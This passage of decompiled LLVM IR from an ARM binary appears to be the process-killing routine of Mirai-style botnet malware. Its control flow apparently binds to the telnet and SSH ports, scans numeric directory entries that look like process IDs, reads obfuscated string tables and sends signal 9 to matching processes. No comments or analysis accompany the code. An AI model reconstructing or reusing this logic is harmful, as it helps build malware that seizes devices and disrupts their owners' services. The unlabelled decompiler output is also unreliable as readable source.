  store i32 %v0_e334, i32* @global_var_2339c.99, align 4
  br i1 %v2_e354, label %dec_label_pc_e370, label %dec_label_pc_e360

dec_label_pc_e360:                                ; preds = %dec_label_pc_e534, %dec_label_pc_e418, %dec_label_pc_e31c
  %v1_e36c = phi i32 [ %v2_e4d0, %dec_label_pc_e418 ], [ %v0_e334, %dec_label_pc_e31c ], [ 0, %dec_label_pc_e534 ]
  store i32 %v6_e31c, i32* %r5.global-to-local, align 4
  ret i32 %v1_e36c

dec_label_pc_e370:                                ; preds = %dec_label_pc_e31c
  %v2_e370 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_e370, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v1_e384 = call i32 @function_ddb4(i32 5888)
  store i32 %v2_e370, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_e398 = load i32, i32* @r5, align 4
  store i32 %v0_e398, i32* %r2.global-to-local, align 4
  %v3_e3a0 = call i32 @function_13940(i32 2, i32 1, i32 %v0_e398)
  %v7_e3a4 = icmp eq i32 %v3_e3a0, -1
  store i32 %v3_e3a0, i32* @r4, align 4
  br i1 %v7_e3a4, label %dec_label_pc_e3cc, label %dec_label_pc_e3b0

dec_label_pc_e3b0:                                ; preds = %dec_label_pc_e370
  %v2_e3b4 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_e3b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e3bc = call i32 @function_136f0(i32 %v3_e3a0, i32 %v2_e3b4, i32 16)
  %v0_e3c0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e3c8 = call i32 @function_137dc(i32 %v0_e3c0, i32 1)
  br label %dec_label_pc_e3cc

dec_label_pc_e3cc:                                ; preds = %dec_label_pc_e370, %dec_label_pc_e3b0
  %v1_e3d0 = call i32 @function_ddb4(i32 5632)
  store i32 %v2_e370, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_e3e4 = load i32, i32* @r5, align 4
  store i32 %v0_e3e4, i32* %r2.global-to-local, align 4
  %v3_e3ec = call i32 @function_13940(i32 2, i32 1, i32 %v0_e3e4)
  %v7_e3f0 = icmp eq i32 %v3_e3ec, -1
  store i32 %v3_e3ec, i32* @r4, align 4
  br i1 %v7_e3f0, label %dec_label_pc_e418, label %dec_label_pc_e3fc

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3cc
  %v2_e400 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_e400, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e408 = call i32 @function_136f0(i32 %v3_e3ec, i32 %v2_e400, i32 16)
  %v0_e40c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e414 = call i32 @function_137dc(i32 %v0_e40c, i32 1)
  br label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e3cc, %dec_label_pc_e3fc
  %v1_e41c = call i32 @function_1524c(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e424 = call i32 @function_13b88()
  store i32 ptrtoint (i32* @global_var_21314.105 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23398.107 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e424, i32* %r2.global-to-local, align 4
  %v0_e434 = load i32, i32* @r5, align 4
  %v1_e434 = trunc i32 %v0_e434 to i8
  %v3_e434 = inttoptr i32 %v0_e424 to i8*
  store i8 %v1_e434, i8* %v3_e434, align 1
  %v0_e43c = load i32, i32* @r5, align 4
  %v1_e43c = load i32, i32* %r3.global-to-local, align 4
  %v2_e43c = inttoptr i32 %v1_e43c to i32*
  store i32 %v0_e43c, i32* %v2_e43c, align 4
  %v0_e440 = load i32, i32* %r2.global-to-local, align 4
  %v1_e440 = load i32, i32* %r1.global-to-local, align 4
  %v2_e440 = inttoptr i32 %v1_e440 to i32*
  store i32 %v0_e440, i32* %v2_e440, align 4
  %v1_e444 = call i32 @function_11be8(i32 6)
  %v1_e44c = call i32 @function_11be8(i32 7)
  %v2_e454 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_e454, i32* %r2.global-to-local, align 4
  %v0_e458 = load i32, i32* @r5, align 4
  store i32 %v0_e458, i32* %r1.global-to-local, align 4
  %v2_e464 = inttoptr i32 %v0_e458 to i32*
  %v3_e464 = call i32 @function_11b24(i32 6, i32* %v2_e464)
  %v1_e46c = add i32 %v2_e454, -52
  store i32 %v1_e46c, i32* %r3.global-to-local, align 4
  store i32 %v3_e464, i32* %r1.global-to-local, align 4
  store i32 %v1_e46c, i32* @r0, align 4
  %v2_e47c = inttoptr i32 %v1_e46c to i8*
  %v3_e47c = call i32 @function_124a8(i8* %v2_e47c, i32 %v3_e464)
  store i32 %v3_e47c, i32* @r0, align 4
  %v2_e484 = add i32 %v3_e47c, %v1_e46c
  store i32 %v2_e484, i32* @r4, align 4
  %v0_e488 = call i32 @function_12d84()
  %v2_e490 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_e490, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_e498 = trunc i32 %v0_e488 to i8
  %v4_e498 = call i32 @function_12974(i8 %v3_e498, i32 10, i32 %v2_e490)
  store i32 %v4_e498, i32* %r1.global-to-local, align 4
  %v0_e4a0 = load i32, i32* @r4, align 4
  store i32 %v0_e4a0, i32* @r0, align 4
  %v2_e4a4 = inttoptr i32 %v0_e4a0 to i8*
  %v3_e4a4 = call i32 @function_124a8(i8* %v2_e4a4, i32 %v4_e498)
  %v0_e4a8 = load i32, i32* @r5, align 4
  store i32 %v0_e4a8, i32* %r1.global-to-local, align 4
  %v1_e4ac = load i32, i32* @r4, align 4
  %v2_e4ac = add i32 %v1_e4ac, %v3_e4a4
  store i32 %v2_e4ac, i32* @r4, align 4
  %v2_e4b4 = inttoptr i32 %v0_e4a8 to i32*
  %v3_e4b4 = call i32 @function_11b24(i32 7, i32* %v2_e4b4)
  store i32 %v3_e4b4, i32* %r1.global-to-local, align 4
  %v0_e4bc = load i32, i32* @r4, align 4
  store i32 %v0_e4bc, i32* @r0, align 4
  %v2_e4c0 = inttoptr i32 %v0_e4bc to i8*
  %v3_e4c0 = call i32 @function_124a8(i8* %v2_e4c0, i32 %v3_e4b4)
  %v0_e4c4 = load i32, i32* @r5, align 4
  store i32 %v0_e4c4, i32* %r1.global-to-local, align 4
  store i32 %v3_e4c0, i32* @r6, align 4
  %v2_e4d0 = call i32 @function_12d24(i32 %v1_e46c, i32 %v0_e4c4)
  %v7_e4d4 = icmp eq i32 %v2_e4d0, -1
  br i1 %v7_e4d4, label %dec_label_pc_e360, label %dec_label_pc_e4dc

dec_label_pc_e4dc:                                ; preds = %dec_label_pc_e418
  %v1_e4dc = call i32 @function_1314c(i32 %v2_e4d0)
  %v1_e4e4 = call i32 @function_11b48(i32 6)
  %v1_e4ec = call i32 @function_11b48(i32 7)
  store i32 ptrtoint (i32* @global_var_23398.107 to i32), i32* %r3.global-to-local, align 4
  %v2_e4f8 = load i32, i32* @global_var_23398.107, align 4
  store i32 %v2_e4f8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_e504 = call i32 @function_12eb0(i32 %v1_e46c, i32 %v2_e4f8, i32 4095)
  %v7_e508 = icmp eq i32 %v3_e504, -1
  br i1 %v7_e508, label %.thread9, label %bb223

bb223:                                            ; preds = %dec_label_pc_e4dc
  %v3_e510 = load i32, i32* @global_var_23398.107, align 4
  store i32 %v3_e510, i32* %r3.global-to-local, align 4
  %v1_e514 = load i32, i32* @r5, align 4
  %v2_e514 = trunc i32 %v1_e514 to i8
  %v5_e514 = add i32 %v3_e510, %v3_e504
  %v6_e514 = inttoptr i32 %v5_e514 to i8*
  store i8 %v2_e514, i8* %v6_e514, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_e4dc, %bb223
  %v0_e51c = load i32, i32* @r6, align 4
  %v1_e51c = load i32, i32* @r4, align 4
  %v1_e46c.neg = sub i32 52, %v2_e454
  %v2_e51c = add i32 %v1_e46c.neg, %v0_e51c
  %v2_e520 = add i32 %v2_e51c, %v1_e51c
  store i32 %v2_e520, i32* %r1.global-to-local, align 4
  %v2_e524 = call i32 @function_12514(i32 %v1_e46c, i32 %v2_e520)
  %v0_e528 = load i32, i32* @r7, align 4
  store i32 %v0_e528, i32* @r4, align 4
  %v0_e52c = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_e638 = ptrtoint i32* %stack_var_-156 to i32
  %v2_e63c = bitcast i32* %stack_var_-156 to i8*
  %v2_e688 = ptrtoint i32* %stack_var_-220 to i32
  %v2_e68c = bitcast i32* %stack_var_-220 to i8*
  %v2_e7f8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_e808 = ptrtoint i32* %stack_var_-48 to i32
  %v2_e81c = ptrtoint i32* %stack_var_-52 to i32
  %v2_e82c = ptrtoint i32* %stack_var_-56 to i32
  %v2_e844 = ptrtoint i32* %stack_var_-60 to i32
  %v2_e858 = ptrtoint i32* %stack_var_-8412 to i32
  br label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e5fc, %.thread9
  %stack_var_-8428.0 = phi i32 [ %v0_e52c, %.thread9 ], [ %stack_var_-8428.3, %dec_label_pc_e5fc ]
  %v1_e538 = call i32 @function_11be8(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e544 = call i32 @function_11b24(i32 6, i32* null)
  %v1_e548 = call i32 @function_13348(i32 %v3_e544)
  store i32 %v1_e548, i32* @r8, align 4
  %v2_e54c = icmp eq i32 %v1_e548, 0
  br i1 %v2_e54c, label %dec_label_pc_e360, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e534
  %v1_e558 = call i32 @function_11b48(i32 6)
  %v0_e55c119 = load i32, i32* @r8, align 4
  %v1_e560120 = inttoptr i32 %v0_e55c119 to i32*
  %v2_e560121 = call i32 @function_1348c(i32* %v1_e560120)
  %v2_e564123 = icmp eq i32 %v2_e560121, 0
  br i1 %v2_e564123, label %dec_label_pc_e5fc, label %dec_label_pc_e56c.preheader

dec_label_pc_e56c.preheader:                      ; preds = %dec_label_pc_e554, %dec_label_pc_e55c.backedge
  %v0_e56c134 = phi i32 [ %v2_e560, %dec_label_pc_e55c.backedge ], [ %v2_e560121, %dec_label_pc_e554 ]
  %stack_var_-8428.1124 = phi i32 [ %stack_var_-8428.1.be, %dec_label_pc_e55c.backedge ], [ %stack_var_-8428.0, %dec_label_pc_e554 ]
  br label %dec_label_pc_e56c

dec_label_pc_e56c:                                ; preds = %dec_label_pc_e56c.preheader, %dec_label_pc_e5e4
  %v0_e57c = phi i32 [ %v2_e5f0, %dec_label_pc_e5e4 ], [ %v0_e56c134, %dec_label_pc_e56c.preheader ]
  %stack_var_-8428.2 = phi i32 [ %v1_e590, %dec_label_pc_e5e4 ], [ %stack_var_-8428.1124, %dec_label_pc_e56c.preheader ]
  %v1_e56c = add i32 %v0_e57c, 11
  %v2_e56c = inttoptr i32 %v1_e56c to i8*
  %v3_e56c = load i8, i8* %v2_e56c, align 1
  %v4_e56c = zext i8 %v3_e56c to i32
  %v1_e570 = add nsw i32 %v4_e56c, -48
  store i32 %v1_e570, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e570, 9
  br i1 %tmp, label %dec_label_pc_e55c.backedge, label %dec_label_pc_e57c

dec_label_pc_e57c:                                ; preds = %dec_label_pc_e56c
  store i32 %v1_e56c, i32* @r6, align 4
  store i32 %v1_e56c, i32* @r0, align 4
  %v1_e584 = call i32 @function_14f98(i32 %v1_e56c)
  %v0_e58c = load i32, i32* @r5, align 4
  %v1_e590 = add i32 %stack_var_-8428.2, 1
  store i32 %v1_e590, i32* %r1.global-to-local, align 4
  store i32 %v1_e584, i32* @r7, align 4
  %v5_e59c = icmp slt i32 %v0_e58c, %v1_e584
  %v2_e60c = call i32 @function_12d98(i32* null)
  br i1 %v5_e59c, label %dec_label_pc_e608, label %dec_label_pc_e5a0

dec_label_pc_e5a0:                                ; preds = %dec_label_pc_e57c
  %v0_e5a8 = load i32, i32* @r4, align 4
  %v2_e5a8 = sub i32 %v2_e60c, %v0_e5a8
  %v7_e5b0 = icmp slt i32 %v2_e5a8, 601
  br i1 %v7_e5b0, label %dec_label_pc_e5b8, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_e5a0
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_e55c.backedge

dec_label_pc_e5b8:                                ; preds = %dec_label_pc_e5a0
  %v0_e5b8 = load i32, i32* @r7, align 4
  %v7_e5bc = icmp slt i32 %v0_e5b8, 401
  br i1 %v7_e5bc, label %dec_label_pc_e55c.backedge, label %dec_label_pc_e5c0

dec_label_pc_e5c0:                                ; preds = %dec_label_pc_e5b8
  %v3_e5c8 = zext i32 %v1_e590 to i64
  %v4_e5c8 = mul nuw i64 %v3_e5c8, 3435973837
  %v3_e5cc1 = udiv i64 %v4_e5c8, 34359738368
  %v3_e5d03 = mul nuw nsw i64 %v3_e5cc1, 8
  %v3_e5d0 = trunc i64 %v3_e5d03 to i32
  store i32 %v3_e5d0, i32* %r3.global-to-local, align 4
  %v2_e5d45 = mul nuw nsw i64 %v3_e5cc1, 2
  %v2_e5d4 = trunc i64 %v2_e5d45 to i32
  %v2_e5d8 = add i32 %v3_e5d0, %v2_e5d4
  store i32 %v2_e5d8, i32* %r2.global-to-local, align 4
  %v9_e5dc = icmp eq i32 %v1_e590, %v2_e5d8
  br i1 %v9_e5dc, label %dec_label_pc_e5e4, label %dec_label_pc_e55c.backedge

dec_label_pc_e5e4:                                ; preds = %dec_label_pc_e5c0
  %v1_e5e8 = call i32 @function_1524c(i32 1)
  %v0_e5ec = load i32, i32* @r8, align 4
  %v1_e5f0 = inttoptr i32 %v0_e5ec to i32*
  %v2_e5f0 = call i32 @function_1348c(i32* %v1_e5f0)
  %v2_e5f4 = icmp eq i32 %v2_e5f0, 0
  br i1 %v2_e5f4, label %dec_label_pc_e5fc, label %dec_label_pc_e56c

dec_label_pc_e5fc:                                ; preds = %dec_label_pc_e55c.backedge, %dec_label_pc_e5e4, %dec_label_pc_e554
  %stack_var_-8428.3 = phi i32 [ %stack_var_-8428.0, %dec_label_pc_e554 ], [ %v1_e590, %dec_label_pc_e5e4 ], [ %stack_var_-8428.1.be, %dec_label_pc_e55c.backedge ]
  %v0_e5fc = load i32, i32* @r8, align 4
  %v1_e600 = inttoptr i32 %v0_e5fc to i32*
  %v2_e600 = call i32 @function_13180(i32* %v1_e600)
  br label %dec_label_pc_e534

dec_label_pc_e608:                                ; preds = %dec_label_pc_e57c
  %v1_e618 = call i32 @function_11be8(i32 6)
  %v1_e620 = call i32 @function_11be8(i32 11)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e62c = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v3_e62c, i32* %r1.global-to-local, align 4
  store i32 %v2_e638, i32* @r0, align 4
  %v3_e63c = call i32 @function_124a8(i8* %v2_e63c, i32 %v3_e62c)
  %v2_e648 = add i32 %v3_e63c, %v2_e638
  store i32 %v2_e648, i32* %r5.global-to-local, align 4
  store i32 %v2_e648, i32* @r0, align 4
  %v0_e650 = load i32, i32* @r6, align 4
  store i32 %v0_e650, i32* %r1.global-to-local, align 4
  %v2_e654 = inttoptr i32 %v2_e648 to i8*
  %v3_e654 = call i32 @function_124a8(i8* %v2_e654, i32 %v0_e650)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e664 = call i32 @function_11b24(i32 7, i32* null)
  store i32 %v3_e664, i32* %r1.global-to-local, align 4
  %v1_e66c = load i32, i32* %r5.global-to-local, align 4
  %v2_e66c = add i32 %v1_e66c, %v3_e654
  store i32 %v2_e66c, i32* @r0, align 4
  %v2_e670 = inttoptr i32 %v2_e66c to i8*
  %v3_e670 = call i32 @function_124a8(i8* %v2_e670, i32 %v3_e664)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e67c = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v3_e67c, i32* %r1.global-to-local, align 4
  store i32 %v2_e688, i32* @r0, align 4
  %v3_e68c = call i32 @function_124a8(i8* %v2_e68c, i32 %v3_e67c)
  store i32 %v2_e688, i32* %r2.global-to-local, align 4
  %v2_e698 = add i32 %v3_e68c, %v2_e688
  store i32 %v2_e698, i32* @r5, align 4
  %v0_e69c = load i32, i32* @r6, align 4
  store i32 %v0_e69c, i32* %r1.global-to-local, align 4
  store i32 %v2_e698, i32* @r0, align 4
  %v2_e6a4 = inttoptr i32 %v2_e698 to i8*
  %v3_e6a4 = call i32 @function_124a8(i8* %v2_e6a4, i32 %v0_e69c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_e6a4, i32* @r4, align 4
  %v3_e6b4 = call i32 @function_11b24(i32 11, i32* null)
  store i32 %v3_e6b4, i32* %r1.global-to-local, align 4
  %v0_e6bc = load i32, i32* @r4, align 4
  %v1_e6bc = load i32, i32* @r5, align 4
  %v2_e6bc = add i32 %v1_e6bc, %v0_e6bc
  store i32 %v2_e6bc, i32* @r0, align 4
  %v2_e6c0 = inttoptr i32 %v2_e6bc to i8*
  %v3_e6c0 = call i32 @function_124a8(i8* %v2_e6c0, i32 %v3_e6b4)
  %v1_e6c8 = call i32 @function_11b48(i32 6)
  %v1_e6d0 = call i32 @function_11b48(i32 11)
  store i32 %v1_e46c, i32* %r1.global-to-local, align 4
  store i32 4095, i32* @r2, align 4
  %v3_e6e8 = call i32 @function_12eb0(i32 %v2_e638, i32 %v1_e46c, i32 4095)
  %v7_e6ec = icmp eq i32 %v3_e6e8, -1
  store i32 %v3_e6e8, i32* @r5, align 4
  br i1 %v7_e6ec, label %dec_label_pc_e7b0, label %dec_label_pc_e6f8

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e608
  store i32 %v1_e46c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_e700 = add i32 %v3_e6e8, %v1_e46c
  %v5_e700 = inttoptr i32 %v4_e700 to i8*
  store i8 0, i8* %v5_e700, align 1
  %v1_e708 = call i32 @function_11be8(i32 10)
  %v0_e70c = load i32, i32* @r4, align 4
  store i32 %v0_e70c, i32* %r1.global-to-local, align 4
  %v2_e714 = inttoptr i32 %v0_e70c to i32*
  %v3_e714 = call i32 @function_11b24(i32 10, i32* %v2_e714)
  %v0_e718 = load i32, i32* @r5, align 4
  %v1_e718 = add i32 %v0_e718, -1
  store i32 %v1_e718, i32* @r1, align 4
  store i32 %v3_e714, i32* %r2.global-to-local, align 4
  %v4_e724 = call i32 @function_127d0(i8* %v2_e47c, i32 %v1_e718, i32 %v3_e714)
  %v7_e728 = icmp eq i32 %v4_e724, -1
  br i1 %v7_e728, label %dec_label_pc_e744, label %dec_label_pc_e730

dec_label_pc_e730:                                ; preds = %dec_label_pc_e6f8
  %v1_e734 = call i32 @function_12cf0(i32 %v1_e46c)
  %v0_e738 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_e740 = call i32 @function_12f18(i32 %v0_e738, i32 9)
  br label %dec_label_pc_e744

dec_label_pc_e744:                                ; preds = %dec_label_pc_e6f8, %dec_label_pc_e730
  %v1_e748 = call i32 @function_11b48(i32 10)
  store i32 %v1_e748, i32* @r0, align 4
  %v0_e74c = call i32 @function_12d84()
  store i32 %v0_e74c, i32* @r0, align 4
  %v1_e750 = load i32, i32* @r7, align 4
  %v9_e750 = icmp eq i32 %v0_e74c, %v1_e750
  br i1 %v9_e750, label %dec_label_pc_e77c, label %dec_label_pc_e758

dec_label_pc_e758:                                ; preds = %dec_label_pc_e744
  %v0_e758 = call i32 @function_12cdc()
  %v1_e75c = load i32, i32* @r7, align 4
  %v9_e75c = icmp eq i32 %v0_e758, %v1_e75c
  br i1 %v9_e75c, label %dec_label_pc_e77c, label %dec_label_pc_e764

dec_label_pc_e764:                                ; preds = %dec_label_pc_e758
  %v2_e76c = load i32, i32* @global_var_23398.107, align 4
  store i32 %v2_e76c, i32* %r1.global-to-local, align 4
  %v3_e770 = call i32 @function_12860(i8* %v2_e47c, i32 %v2_e76c)
  %v2_e774 = icmp eq i32 %v3_e770, 0
  br i1 %v2_e774, label %dec_label_pc_e788, label %dec_label_pc_e764.dec_label_pc_e77c_crit_edge

dec_label_pc_e764.dec_label_pc_e77c_crit_edge:    ; preds = %dec_label_pc_e764
  %v0_e780.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e77c

dec_label_pc_e77c:                                ; preds = %dec_label_pc_e764.dec_label_pc_e77c_crit_edge, %dec_label_pc_e758, %dec_label_pc_e744
  %v0_e780 = phi i32 [ %v0_e780.pre, %dec_label_pc_e764.dec_label_pc_e77c_crit_edge ], [ %v0_e758, %dec_label_pc_e758 ], [ %v0_e74c, %dec_label_pc_e744 ]
  store i32 %v2_e60c, i32* @r4, align 4
  store i32 %v0_e780, i32* @r5, align 4
  br label %dec_label_pc_e55c.backedge

dec_label_pc_e55c.backedge:                       ; preds = %dec_label_pc_e5c0, %dec_label_pc_e5b8, %dec_label_pc_e56c, %dec_label_pc_e77c, %dec_label_pc_ea3c, %.thread10
  %stack_var_-8428.1.be = phi i32 [ %v1_e590, %dec_label_pc_ea3c ], [ %v1_e590, %dec_label_pc_e77c ], [ %v1_e590, %.thread10 ], [ %stack_var_-8428.2, %dec_label_pc_e56c ], [ %v1_e590, %dec_label_pc_e5b8 ], [ %v1_e590, %dec_label_pc_e5c0 ]
  %v0_e55c = load i32, i32* @r8, align 4
  %v1_e560 = inttoptr i32 %v0_e55c to i32*
  %v2_e560 = call i32 @function_1348c(i32* %v1_e560)
  %v2_e564 = icmp eq i32 %v2_e560, 0
  br i1 %v2_e564, label %dec_label_pc_e5fc, label %dec_label_pc_e56c.preheader

dec_label_pc_e788:                                ; preds = %dec_label_pc_e764
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e790 = call i32 @function_12d24(i32 %v1_e46c, i32 0)
  %v7_e794 = icmp eq i32 %v2_e790, -1
  store i32 %v2_e790, i32* @r4, align 4
  br i1 %v7_e794, label %bb224, label %.thread12

bb224:                                            ; preds = %dec_label_pc_e788
  store i32 9, i32* %r1.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e788, %bb224
  store i32 59304, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_e794, i32 ptrtoint (i32* @global_var_12f18.109 to i32))
  %v0_e7a8 = load i32, i32* @r4, align 4
  %v1_e7ac = call i32 @function_1314c(i32 %v0_e7a8)
  br label %dec_label_pc_e7b0

dec_label_pc_e7b0:                                ; preds = %dec_label_pc_e608, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e7bc = call i32 @function_12d24(i32 %v2_e638, i32 0)
  %v7_e7c0 = icmp eq i32 %v2_e7bc, -1
  br i1 %v7_e7c0, label %dec_label_pc_ea3c, label %dec_label_pc_e7cc

dec_label_pc_e7cc:                                ; preds = %dec_label_pc_e7b0
  %v1_e7d0 = call i32 @function_11be8(i32 12)
  %v1_e7d8 = call i32 @function_11be8(i32 13)
  %v1_e7e0 = call i32 @function_11be8(i32 14)
  %v1_e7e8 = call i32 @function_11be8(i32 15)
  %v1_e7f0 = call i32 @function_11be8(i32 16)
  store i32 %v2_e7f8, i32* %r1.global-to-local, align 4
  %v3_e800 = call i32 @function_11b24(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_e808, i32* %r1.global-to-local, align 4
  store i32 %v3_e800, i32* @r6, align 4
  %v3_e814 = call i32 @function_11b24(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_e81c, i32* %r1.global-to-local, align 4
  store i32 %v3_e814, i32* @sl, align 4
  %v3_e828 = call i32 @function_11b24(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_e82c, i32* %r1.global-to-local, align 4
  store i32 %v3_e828, i32* @sb, align 4
  %v3_e838 = call i32 @function_11b24(i32 15, i32* nonnull %stack_var_-56)
  store i32 %v3_e838, i32* @fp, align 4
  store i32 %v2_e844, i32* %r1.global-to-local, align 4
  %v3_e84c = call i32 @function_11b24(i32 16, i32* nonnull %stack_var_-60)
  store i32 %v2_e858, i32* @r4, align 4
  store i32 %v2_e858, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_e868116 = call i32 @function_12ee4(i32 %v2_e7bc)
  %tmp225 = icmp slt i32 %v1_e868116, 1
  br i1 %tmp225, label %dec_label_pc_ea70, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %dec_label_pc_e7cc, %dec_label_pc_e85c.backedge
  %v0_e8fc107 = phi i32 [ %v1_e868, %dec_label_pc_e85c.backedge ], [ %v1_e868116, %dec_label_pc_e7cc ]
  store i32 %v2_e370, i32* %r1.global-to-local, align 4
  %v3_e878 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e878, i32* @r5, align 4
  %v5_e880 = icmp slt i32 %v0_e8fc107, %v3_e878
  br i1 %v5_e880, label %dec_label_pc_e890, label %dec_label_pc_e93c.lr.ph

dec_label_pc_e93c.lr.ph:                          ; preds = %dec_label_pc_e874
  %v1_e93472 = add i32 %v0_e8fc107, -1
  store i32 %v1_e93472, i32* %r1.global-to-local, align 4
  %v0_e93c.pre = load i32, i32* @r6, align 4
  %v1_e940.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e93c

dec_label_pc_e890:                                ; preds = %dec_label_pc_e934.backedge, %dec_label_pc_e874
  store i32 %v2_e370, i32* %r2.global-to-local, align 4
  %v3_e894 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_e894, i32* @r5, align 4
  %v5_e89c = icmp slt i32 %v0_e8fc107, %v3_e894
  br i1 %v5_e89c, label %dec_label_pc_e8ac, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_e890
  %v1_e96881 = add i32 %v0_e8fc107, -1
  store i32 %v1_e96881, i32* %r1.global-to-local, align 4
  %v2_e96882 = icmp eq i32 %v0_e8fc107, 0
  br i1 %v2_e96882, label %dec_label_pc_e8ac, label %dec_label_pc_e970.lr.ph

dec_label_pc_e970.lr.ph:                          ; preds = %.thread28
  %v0_e970.pre = load i32, i32* @sl, align 4
  %v1_e974.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e970

dec_label_pc_e8ac:                                ; preds = %dec_label_pc_e968.backedge, %.thread28, %dec_label_pc_e890
  store i32 %v2_e370, i32* %r3.global-to-local, align 4
  %v3_e8b0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e8b0, i32* @r5, align 4
  %v5_e8b8 = icmp slt i32 %v0_e8fc107, %v3_e8b0
  br i1 %v5_e8b8, label %dec_label_pc_e8c8, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_e8ac
  %v1_e99c90 = add i32 %v0_e8fc107, -1
  store i32 %v1_e99c90, i32* %r1.global-to-local, align 4
  %v2_e99c91 = icmp eq i32 %v0_e8fc107, 0
  br i1 %v2_e99c91, label %dec_label_pc_e8c8, label %dec_label_pc_e9a4.lr.ph

dec_label_pc_e9a4.lr.ph:                          ; preds = %.thread37
  %v0_e9a4.pre = load i32, i32* @sb, align 4
  %v1_e9a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e9a4

dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e99c.backedge, %.thread37, %dec_label_pc_e8ac
  %v3_e8cc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_e8cc, i32* @r5, align 4
  %v5_e8d4 = icmp slt i32 %v0_e8fc107, %v3_e8cc
  br i1 %v5_e8d4, label %dec_label_pc_e8e4, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_e8c8
  %v1_e9d099 = add i32 %v0_e8fc107, -1
  store i32 %v1_e9d099, i32* %r1.global-to-local, align 4
  %v2_e9d0100 = icmp eq i32 %v0_e8fc107, 0
  br i1 %v2_e9d0100, label %dec_label_pc_e8e4, label %dec_label_pc_e9d8.lr.ph

dec_label_pc_e9d8.lr.ph:                          ; preds = %.thread46
  %v0_e9d8.pre = load i32, i32* @fp, align 4
  %v1_e9dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e9d8

dec_label_pc_e8e4:                                ; preds = %dec_label_pc_e9d0.backedge, %.thread46, %dec_label_pc_e8c8
  store i32 %v2_e370, i32* %r1.global-to-local, align 4
  %v3_e8e8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e8e8, i32* @lr, align 4
  %v5_e8f0 = icmp slt i32 %v0_e8fc107, %v3_e8e8
  br i1 %v5_e8f0, label %dec_label_pc_e85c.backedge, label %.thread52

dec_label_pc_e85c.backedge:                       ; preds = %dec_label_pc_e91c, %.thread52, %dec_label_pc_e8e4
  store i32 %v2_e858, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_e868 = call i32 @function_12ee4(i32 %v2_e7bc)
  %tmp226 = icmp slt i32 %v1_e868, 1
  br i1 %tmp226, label %dec_label_pc_ea70, label %dec_label_pc_e874

.thread52:                                        ; preds = %dec_label_pc_e8e4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e8fc109 = icmp eq i32 %v0_e8fc107, 0
  br i1 %v2_e8fc109, label %dec_label_pc_e85c.backedge, label %dec_label_pc_e904.lr.ph

dec_label_pc_e904.lr.ph:                          ; preds = %.thread52
  %v1_e90c.pre = load i32, i32* @r4, align 4
